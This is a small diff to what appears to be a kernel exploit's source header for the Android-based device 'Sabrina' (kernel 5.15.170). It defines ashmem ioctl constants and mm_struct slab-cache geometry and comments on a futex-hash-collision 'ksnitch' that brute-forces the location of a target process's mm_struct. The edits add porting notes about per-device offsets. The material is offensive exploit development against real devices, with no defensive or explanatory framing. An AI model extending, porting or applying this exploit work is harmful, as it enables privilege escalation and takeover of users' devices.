@@ -51,7 +51,11 @@
 #define __ASHMEMIOC 0x77
 #define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
 
-/* mm_cachep geometry on sabrina (5.15.170), re-verified in the vmlinux
+/* Reference defaults for Sabrina (5.15.170). Device profiles override the
+ * address/SLUB ABI values through runtime_struct_offsets.h; the reclaim
+ * strategy values below are not portable merely because an order matches.
+ *
+ * mm_cachep geometry on Sabrina, re-verified in the vmlinux
  * disassembly: mm_cache_init() is a SEPARATE function from
  * proc_caches_init() (the 0x820 = 2080 of the session-3 notes belongs to
  * the *sighand_cache* kmem_cache_create_usercopy call, not mm_struct):
@@ -90,7 +94,8 @@
 #define MM_ORDER 2
 #define MM_PARTIALS 2
 #define CORE 0
-/* Number of colliding futex addresses the ksnitch requires. With N
+/* Sabrina strategy value, not a V643 measurement. Number of colliding futex
+ * addresses the ksnitch requires. With N
  * addresses the bruteforce imposes N-1 hash constraints per candidate.
  * With the correct 1024 stride/kernel hashsize the true mm is the UNIQUE
  * solution at N=8 (verified offline against a captured collision set:
